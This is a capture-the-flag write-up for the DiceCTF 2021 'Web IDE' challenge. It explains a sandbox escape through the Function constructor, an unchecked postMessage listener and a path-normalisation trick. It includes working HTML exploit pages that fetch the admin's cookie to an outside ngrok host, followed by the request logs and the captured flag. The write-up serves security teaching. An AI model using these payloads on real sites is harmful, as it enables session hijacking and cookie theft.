# Web IDE

This is not the intended solution.

## Description

Work on JavaScript projects directly in your browser! Make something cool? Send it [here](https://us-east1-dicegang.cloudfunctions.net/ctf-2021-admin-bot?challenge=web-ide)

[web-ide.dicec.tf](https://web-ide.dicec.tf/)

Downloads
[index.js](https://dicegang.storage.googleapis.com/uploads/972cecf4efcebf733ec0c1dc4ee033cfe06c4b385c0ecf37306ae1399dd41f4c/index.js)

## Enumeration

### index.js

Since we can send links to an admin, let's assume we need to steal a cookie.  Checking the server source we see

```javascript
app.post('/ide/login', (req, res) => {
  const { user, password } = req.body;
  switch (user) {
  case 'guest':
    return res.cookie('token', 'guest', {
      path: '/ide',
      sameSite: 'none',
      secure: true
    }).redirect('/ide/');
  case 'admin':
    if (password === adminPassword)
      return res.cookie('token', `dice{${process.env.FLAG}}`, {
        path: '/ide',
        sameSite: 'none',
        secure: true
      }).redirect('/ide/');
    break;
  }
  res.status(401).end();
});
```

It would seem our assumption is correct.  The `adminPassword` looks to be 16 random bytes so we won't be able to guess it, which means we'll likely need XSS off of the `/ide` route, that we can send to the admin.  Lets take a look at the site in the browser.

### web-ide.dicec.tf

Navigating to the site there's a short intro, `Web IDE: An IDE (that's not really an IDE) on the web!`, and a link to `https://web-ide.dicec.tf/ide/`.  After we login as `guest` and are redirected, we have a `<textarea>console.log('Hello World!');</textarea>` and an `<iframe src="../sandbox.html" frameborder="0" sandbox="allow-scripts"></iframe>`, and the latter looks to run the code in the textarea and displays the console output when we click the `Run Code` button.  There's also a `Save Code (Admin Only)` button.  Looking at the code for the page, we find that the communication for the guest button happens via [postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), and that there is no specific target origin:

```javascript
  document.getElementById('run').addEventListener('click', () => {
    document.querySelector('iframe')
      .contentWindow
      .postMessage(document.querySelector('textarea').value, '*');
  });
```

The admin button uses the `/ide/save` route to both post and get the script.  However, the header on the response is `application/javascript`, so the 
response isn't executed.  Lets take a look at the sandbox.

#### /sandbox.html

Looking at the sandbox, we find it includes a `sandbox.js` that does a few different things.  It listens for the `message` events that the editor sends and runs `safeEval` on them, as well as providing its own specific logging function.  However, the messages are cross-origin, and it doesn't look to be checking the origin of the message, which means we could embed the sandbox in our own page and send messages that the sandbox will then try and render.

```javascript
  window.addEventListener('message', (event) => {
    const div = document.querySelector('div');
    if (div) document.body.removeChild(div);
    document.body.appendChild(document.createElement('div'));
    try {
      safeEval(event.data);
    } catch (e) {
      log(e);
    }
  });
```

The `safeEval` looks to accept the code as a string, then creates a proxy for `window` that returns `undefined` for everything but `eval` and `console`.  For `console.log` it adds its own function that appends the output to a div on the page.  It's using `element.textContent` though so no luck with XSS there.  Perhaps we can escape the `safeEval`:

```javascript
  const safeEval = (d) => (function (data) {
    with (new Proxy(window, {
      get: (t, p) => {
        console.log(p);
        if (p === 'console') return { log };
        if (p === 'eval') return window.eval;
        return undefined;
      }
    })) {
      eval(data);
    }
  }).call(Object.create(null), d);
```

When using `eval`, the evaluated code runs in the calling scope, this is why changing `window` to a proxy prevents us from directly access something like `window.document.cookie`.  However, `eval` is not the only way to evaluate code.  There's also `setTimeout('code()')` and `Function('code()')`, and both of these run the evaluated code in the global scope.  So if we can use one of them, our code will be able to access `window` again. We likely won't have access to `window.setTimeout`, but getting access to a `Function` object should be relatively easy as it's the constructor for every function, and is accessible as the `constructor` property on a function.  So we have all kinds of options:

```javascript
log.constructor('alert()')();
''.match.constructor('alert()')();
eval.constructor('alert()')();
(()=>{}).constructor('alert()')();
[].map.constructor('alert()')();
let t={};t.valueOf.constructor('alert()')();
```

You get the idea.

## First Exploit Attempt

So now we should have arbitrary XSS.  Lets fire up our own local server and ngrok and create an html file to load the sandbox, and send our payload:

```html
<iframe id=sand src=https://web-ide.dicec.tf/sandbox.html></iframe>
<script>
  onload = () => {
    sand.contentWindow.postMessage(`log.constructor('fetch("https://b9be14aa2cf4.ngrok.io/b64/" + btoa(document.cookie));')()`, '*');
  };
</script>
```

When we send to the admin we get two hits on our local server:

```http
00:41:31: GET /dice21/web-ide/exp1.html
        Host: b9be14aa2cf4.ngrok.io
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate, br
        X-Forwarded-Proto: https
        X-Forwarded-For: 2600:1900:2001:b:400::1


00:41:31: GET /b64/
        Host: b9be14aa2cf4.ngrok.io
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.0 Safari/537.36
        Accept: */*
        Origin: https://web-ide.dicec.tf
        Sec-Fetch-Site: cross-site
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Referer: https://web-ide.dicec.tf/
        Accept-Encoding: gzip, deflate, br
        X-Forwarded-Proto: https
        X-Forwarded-For: 2600:1900:2001:b:400::1
```

It would seem that the headless chrome instance did execute the code, and we got the request for the `/b64/` route, but `document.cookie` was empty.  What gives?  Visiting the exploit url in our own browser and looking in dev tools, even though we've logged in as `guest` there's no cookie.  Lets revisit the server code that sets the cookie

```js
  return res.cookie('token', `dice{${process.env.FLAG}}`, {
    path: '/ide',
    sameSite: 'none',
    secure: true
  }).redirect('/ide/');
```

Aha, it's confined to the `/ide` path.  We can get around this by using a relative path, tricking the browser into thinking we're on the `/ide` route, while still accessing `sandbox.html` which allows XSS and thus giving us access to the cookie. This is possible because Express doesn't normalize the route until it hits the `app.use(express.static('public/root'));` handler.

```shell
╭─zoey@parrot-virtual ~/sec/htb/oouch ‹master*› 
╰─$ curl -v --path-as-is https://web-ide.dicec.tf/ide/../sandbox.html
[...]
> GET /ide/../sandbox.html HTTP/2
> Host: web-ide.dicec.tf
> user-agent: curl/7.72.0
> accept: */*
> 
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
* Connection state changed (MAX_CONCURRENT_STREAMS == 250)!
< HTTP/2 200 
< accept-ranges: bytes
< cache-control: public, max-age=0
< content-type: text/html; charset=UTF-8
< date: Mon, 08 Feb 2021 01:51:12 GMT
< etag: W/"b0-17769ce3e20"
< last-modified: Wed, 03 Feb 2021 21:31:00 GMT
< x-frame-options: DENY
< x-powered-by: Express
< content-length: 176
< 
<!doctype html>
<html>
  <head>
    <script src="src/sandbox.js"></script>
    <link rel="stylesheet" href="src/styles.css"/>
  </head>
  <body id="sandbox">
  </body>
</html>
```

However, we now have a couple more issues to fix.  The browser itself will normalize URLs, and we now have the sandbox page, but if you'll notice, it now has the `x-frame-options: DENY` header.  We can get around the browser normalization by adding in a `%2f` to the path, and we can use `window.open` instead of an iframe.  The final payload looks like the following:

```html
<script>
  window.onload = () => {
    let w = window.open("https://web-ide.dicec.tf/ide/..%2f/sandbox.html");
    setTimeout(() => {
      w.postMessage(`log.constructor('fetch("https://a94c78fa193e.ngrok.io/b64/" + btoa(document.cookie));')()`, '*');
    }, 1000);
  };
</script>
```

We send a link to this file, which is hosted via ngrok on our local server.  If everything does to plan, we should get a hit on our local server:

```
22:09:14: GET /b64/dG9rZW49ZGljZXtjMHVsZG43X2YxbmRfNF9iNGNrcjBueW1fZjByXzFkZX0=
        Host: b9be14aa2cf4.ngrok.io
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.0 Safari/537.36
        Accept: */*
        Origin: https://web-ide.dicec.tf
        Sec-Fetch-Site: cross-site
        Sec-Fetch-Mode: cors
        Sec-Fetch-Dest: empty
        Referer: https://web-ide.dicec.tf/
        Accept-Encoding: gzip, deflate, br
        X-Forwarded-Proto: https
        X-Forwarded-For: 2600:1900:2000:72:400::b


token=dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}
```